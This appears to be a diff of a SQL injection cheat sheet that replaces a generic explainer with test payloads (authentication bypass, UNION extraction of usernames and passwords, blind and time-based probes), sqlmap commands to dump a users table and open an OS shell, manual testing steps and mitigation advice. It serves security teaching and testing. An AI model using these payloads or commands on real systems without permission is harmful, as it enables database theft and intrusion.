@@ -1,36 +1,76 @@
 # What is SQL Injection?
-SQL Injection (SQLi) is a common type of cyber attack that targets databases through web applications. It allows attackers to manipulate SQL queries executed by the application's database, potentially gaining unauthorized access to sensitive information or even control over the database.
 
-## How Does SQL Injection Work?
-- Input Fields: Web applications often use input fields (like login forms, search bars, or user inputs) where users can enter data.
+SQL Injection (SQLi) happens when user input is concatenated straight into a SQL query, letting an attacker change the query's logic. It is one of the oldest bugs on the OWASP Top 10 and still shows up because people build queries with string formatting instead of parameters.
 
-- Malicious Input: Attackers input specially crafted SQL commands into these fields instead of regular data.
+## Types
 
-- Execution: When the application fails to properly validate or sanitize the input, it directly incorporates the attacker's input into SQL queries without proper safeguards.
+- **In-band** - results come back in the same response (error-based, UNION-based)
+- **Blind** - no direct output; you infer data from boolean responses or time delays
+- **Out-of-band** - data is exfiltrated over a second channel like DNS
 
-- Database Interaction: The attacker's malicious SQL commands are executed by the database server, allowing them to perform unauthorized actions such as retrieving, modifying, or deleting data.
+## Test payloads
 
-## Example Scenario:
-Consider a simple login form on a website. The application takes a username and password from the user and checks them against a database to authenticate.
+```sql
+-- Auth bypass classic
+' OR '1'='1' --
+admin' --
 
-- Legitimate Input: A user enters their username and password as usual.
-- Malicious Input: An attacker enters a specially crafted input like ' OR '1'='1. This input manipulates the SQL query to always return true, effectively bypassing the login authentication.
+-- Break the query to confirm the bug
+'
+1' AND '1'='2
 
-## Impact of SQL Injection:
-- Data Leakage: Attackers can extract sensitive information from databases, including user credentials, personal data, or financial records.
+-- UNION to pull data (match column count first)
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT username,password,NULL FROM users --
 
-- Data Manipulation: SQL Injection can allow attackers to modify or delete data within the database, potentially causing data loss or damage.
+-- Blind boolean
+' AND SUBSTRING((SELECT database()),1,1)='a' --
 
-- Unauthorized Access: Attackers may gain unauthorized access to administrative features or privileged accounts within the application.
+-- Time-based (MySQL / Postgres)
+' AND SLEEP(5) --
+'; SELECT pg_sleep(5) --
+```
 
-## Mitigating SQL Injection:
-- Parameterized Queries: Use parameterized queries or prepared statements to separate SQL code from user input, preventing direct concatenation of input into SQL queries.
+## Tools
 
-- Input Validation and Sanitization: Validate and sanitize user input to remove or encode potentially harmful characters before incorporating them into SQL queries.
+- [sqlmap](https://sqlmap.org/) - automated detection and exploitation
+- [Burp Suite](https://portswigger.net/burp) - Repeater to tune payloads by hand
+- [Ghauri](https://github.com/r0oth3x49/ghauri) - fast alternative to sqlmap
 
-- Least Privilege Principle: Restrict database permissions for application accounts to minimize the impact of successful SQL Injection attacks.
+## Commands
 
-- Web Application Firewalls (WAF): Implement WAFs to detect and block malicious SQL Injection attempts at the network level.
+```bash
+# Point sqlmap at a request captured from Burp
+sqlmap -r request.txt --batch --dbs
 
-## Conclusion:
-SQL Injection is a significant threat to web applications that interact with databases. By understanding how SQL Injection works and implementing appropriate mitigation measures such as parameterized queries and input validation, developers can significantly reduce the risk of exploitation and safeguard sensitive data. Regular security testing and updates are essential to maintaining a secure software environment.
+# Dump a specific table
+sqlmap -u "https://target.tld/item?id=1" --dump -T users -D shop
+
+# Grab an OS shell if stacked queries are allowed
+sqlmap -u "https://target.tld/item?id=1" --os-shell
+```
+
+## Manual testing
+
+1. Add a single quote `'` to each parameter and watch for SQL errors or 500s
+2. Confirm logic with `' AND '1'='1` (true) vs `' AND '1'='2` (false)
+3. Find the column count with `ORDER BY n` until it errors
+4. Match types in a `UNION SELECT` and read data
+5. If nothing reflects, fall back to boolean or time-based blind
+
+## Mitigation
+
+- Use parameterized queries / prepared statements everywhere - never string concatenation
+- Use an ORM correctly (avoid raw query escapes)
+- Apply least privilege to the DB account (no `FILE`, no admin)
+- Validate and allowlist input types (numeric IDs stay numeric)
+- A WAF helps but is not a fix on its own
+
+## Deep dive
+
+- [SQL Injection - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
+- [PortSwigger SQLi labs](https://portswigger.net/web-security/sql-injection)
+
+## CWE
+
+- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
